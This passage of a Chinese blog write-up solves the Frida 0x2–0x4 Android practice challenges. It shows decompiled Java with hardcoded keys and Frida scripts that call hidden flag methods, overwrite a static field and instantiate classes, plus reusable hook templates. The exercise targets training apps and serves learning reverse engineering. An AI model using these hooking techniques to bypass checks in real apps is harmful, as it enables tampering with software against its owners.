class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">static</span> TextView t1;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> &#123;<br>        <span class="hljs-keyword">if</span>(a == <span class="hljs-number">4919</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher0</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>                <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]);<br>                cipher0.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;HILLBILLWILLBINN&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>), iv);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">decryptedText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher0.doFinal(Base64.decode(<span class="hljs-string">&quot;q7mBQegjhpfIAr0OgfLvH0t/D0Xi0ieG0vd+8ZVW+b4=&quot;</span>, <span class="hljs-number">0</span>)));<br>                MainActivity.t1.setText(decryptedText);<br>            &#125;<br>            <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        MainActivity.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textview);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-类"><a href="#MainActivity-类" class="headerlink" title="MainActivity 类"></a>MainActivity 类</h3><p><code>MainActivity</code> 类中有一个静态方法 <code>get_flag()</code> ，如果传入的 参数 <code>a==4919</code>，那么就解密 flag 输出</p><p><img src="https://img.dkdun.cn/v1/2025/12/a4dd2f8fd02552e1.png"></p><p>可以发现 <code>get_flag()</code> 方法在程序中并没有被调用，所以我们需要在注入时去调用这个静态方法</p><p><img src="https://img.dkdun.cn/v1/2025/12/446e6378ec5d70d2.png"></p><p>方法就是：主动去调用静态方法</p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>先启动程序（必须），然后进行 hook，直接把代码写在终端运行，保证在启动之后运行，如果像以前一样加上文件执行会 hook 不到，看到 SWDD 用 <code>frida -U &#39;Frida 0x2&#39; -l hook2.js</code>  命令能执行，但是我的 cmd 和 PowerShell 都不能转义空格，单引号双引号也不行，然后就识别不到进程名称，所以这个方法实现不了</p><p><img src="https://img.dkdun.cn/v1/2025/12/d5c41a54bb0558cd.png"></p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>更加简洁的 demo，虽然核心代码差不多一样，但是方法 1 中多了个 <code>setImmediate()</code> 函数，它会比程序先执行，也就是说在程序还没执行之前它调用的函数就已经执行完了，如果没有运行程序的话，相当于没有 hook</p><p>本方法中是注入之后立即调用执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>先打开程序用 <code>-F</code> 命令直接附加到当前前台正在运行的程序上，秒出结果</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">frida -U -F -l hook2.js<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/df67d0a70ca92131.png"></p><h3 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h3><p>对于方法 1 的 <code>setImmediate(main)</code>，还可以改为 <code>setTimeout(main,1000)</code>，参考 SWDD 的：<a href="https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/">https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/</a></p><p>对于 <code>setImmediate</code> 和 <code>setTimeout</code>：<a href="https://www.cnblogs.com/fsjohnhuang/p/4151595.html">https://www.cnblogs.com/fsjohnhuang/p/4151595.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook2</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eeb729d7f873b417.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>主要是 hook 调用未被执行的静态方法，指定的类中包含了静态的方法，则我们可以直接调用该方法</p><p>hook 模板如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(“&lt;package_name&gt;.&lt;<span class="hljs-keyword">class</span>&gt;”);<br>     &lt;class_reference&gt;.<span class="hljs-keyword">function</span>(<span class="hljs-params">val</span>); <span class="hljs-comment">// 需要调用的方法名称</span><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x3"><a href="#Frida-0x3" class="headerlink" title="Frida 0x3"></a>Frida 0x3</h1><h2 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h2><p>这一次有按钮了，并且点击会出现 【TRY AGAIN】</p><p><img src="https://img.dkdun.cn/v1/2025/12/fd1bc91eb334e1a0.png"></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>还是反编译看 Jvav 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x3;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View.OnClickListener;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-built_in">this</span>.setContentView(layout.activity_main);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">btn</span> <span class="hljs-operator">=</span> (Button)<span class="hljs-built_in">this</span>.findViewById(id.button);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView)<span class="hljs-built_in">this</span>.findViewById(id.textView);<br>        btn.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// android.view.View$OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>                <span class="hljs-type">byte</span>[] arr_b1;<br>                <span class="hljs-keyword">if</span>(Checker.code == <span class="hljs-number">0x200</span>) &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;YOU WON!!!&quot;</span>, <span class="hljs-number">1</span>).show();<br>                    <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">KS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;glass123&quot;</span>.getBytes(), <span class="hljs-string">&quot;Blowfish&quot;</span>);<br>                    <span class="hljs-type">byte</span>[] arr_b = Base64.getDecoder().decode(<span class="hljs-string">&quot;MKxsZsY9Usw3ozXKKzTF0ymIaC8rs0AY74GnaKqkUrk=&quot;</span>);<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;Blowfish&quot;</span>);<br>                        cipher.init(<span class="hljs-number">2</span>, KS);<br>                        arr_b1 = cipher.doFinal(arr_b);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(NoSuchAlgorithmException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(NoSuchPaddingException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(IllegalBlockSizeException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(BadPaddingException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(InvalidKeyException e) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                    &#125;<br><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(arr_b1, Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    MainActivity.<span class="hljs-built_in">this</span>.t1.setText(decryptedString);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>.getApplicationContext(), <span class="hljs-string">&quot;TRY AGAIN&quot;</span>, <span class="hljs-number">1</span>).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="MainActivity-类-1"><a href="#MainActivity-类-1" class="headerlink" title="MainActivity 类"></a>MainActivity 类</h3><p>可以看到设置了一个按钮点击监听器，当点击按钮时，会检查 <code>Checker.code</code> 是否为 <code>0x200</code>，如果是则显示 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/ba13423709189d44.png"></p><h3 id="Checker-类"><a href="#Checker-类" class="headerlink" title="Checker 类"></a>Checker 类</h3><p>分析 <code>Checker</code> 类能发现有一个静态变量 <code>code</code>，值为 0，还有一个静态方法 <code>increase()</code> 让 <code>code+2</code>，但是在程序中并没有被调用</p><p><img src="https://img.dkdun.cn/v1/2025/12/5083d2738271bf78.png"></p><p>这时有两个方法：</p><ol><li>直接 hook <code>Checker</code> 类的 <code>code</code> 变量，值为 <code>0x200</code></li><li>主动调用 <code>increase()</code> 方法让 <code>code</code> 累加到 <code>0x200</code></li></ol><h2 id="Hook-1"><a href="#Hook-1" class="headerlink" title="Hook"></a>Hook</h2><h3 id="hook-静态变量-code"><a href="#hook-静态变量-code" class="headerlink" title="hook 静态变量 code"></a>hook 静态变量 code</h3><p>现在 hook 代码中的类不再是 <code>MainActivity</code> 而是 <code>Checker</code> 了，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);<br>   <span class="hljs-title class_">Checker</span>.<span class="hljs-property">code</span>.<span class="hljs-property">value</span>=<span class="hljs-number">0x200</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook3</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p>点击一下就得出结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/51528caae6e8f981.png"></p><h3 id="主动调用-increase-方法"><a href="#主动调用-increase-方法" class="headerlink" title="主动调用 increase() 方法"></a>主动调用 increase() 方法</h3><p>写一个简单的 <code>for</code> 循环，累加 0x100 次</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        <span class="hljs-title class_">Checker</span>.<span class="hljs-title function_">increase</span>();<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;value:&quot;</span>,<span class="hljs-title class_">Checker</span>.<span class="hljs-property">code</span>.<span class="hljs-property">value</span>);<span class="hljs-comment">//可以选择不打印</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook3</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p>当累加到 512 时就得到结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/4468d0ddf458822d.png"></p><h2 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>主要是去改变类中的静态变量的值</p><p>Frida 更改变量值的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(“&lt;package_name&gt;.&lt;<span class="hljs-keyword">class</span>&gt;”);<br>     &lt;class_reference&gt;.&lt;variable&gt;.<span class="hljs-property">value</span> = &lt;value&gt;; <span class="hljs-comment">//需要修改的变量</span><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x4"><a href="#Frida-0x4" class="headerlink" title="Frida 0x4"></a>Frida 0x4</h1><h2 id="运行-2"><a href="#运行-2" class="headerlink" title="运行"></a>运行</h2><p>也是一个没有输入的只有一个静态页面</p><p><img src="https://img.dkdun.cn/v1/2025/12/b2e578f70007aa20.png"></p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>反编译看代码，这次用的 Jadx</p><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x4;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.txtview);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Check</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x4;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Check</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_flag</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> &#123;<br>        <span class="hljs-keyword">if</span> (a == <span class="hljs-number">1337</span>) &#123;<br>            <span class="hljs-type">byte</span>[] decoded = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes().length];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes().length; i++) &#123;<br>                decoded[i] = (<span class="hljs-type">byte</span>) (<span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes()[i] ^ <span class="hljs-number">15</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decoded);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Check-类"><a href="#Check-类" class="headerlink" title="Check 类"></a>Check 类</h3><p><code>MainActivity</code> 类中没啥好分析的，重点来分析 <code>Check</code> 类</p><p><code>Check</code> 类中有一个 <code>get_flag</code> 方法，当 <code>a==1337</code> 时，会输出解密的字符串，可以发现程序没有对这个方法调用，并且它也不是静态方法，这是一个方法的声明，所以需要先实例化，再通过实例去调用这个方法返回结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/1a78d2196107b283.png"></p><h2 id="Hook-2"><a href="#Hook-2" class="headerlink" title="Hook"></a>Hook</h2><p>使用 <code>$new()</code> 实例化 <code>Check</code> 类的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook4</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Check</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x4.Check&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckObj</span>=<span class="hljs-title class_">Check</span>.$new();<br><span class="hljs-keyword">var</span> result=<span class="hljs-title class_">CheckObj</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1337</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook4</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>直接输出结果</p><p><img src="https://img.dkdun.cn/v1/2025/12/005cc375e853f8e1.png"></p><h2 id="Conclusion-2"><a href="#Conclusion-2" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>非静态方法 -&gt; 实例化 -&gt; 通过实例调用方法</p><p>Frida 创建类实例的模板如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>  <span class="hljs-keyword">var</span> &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); <span class="hljs-comment">// 创建类的实例</span><br>  &lt;class_instance&gt;.&lt;method&gt;(); <span 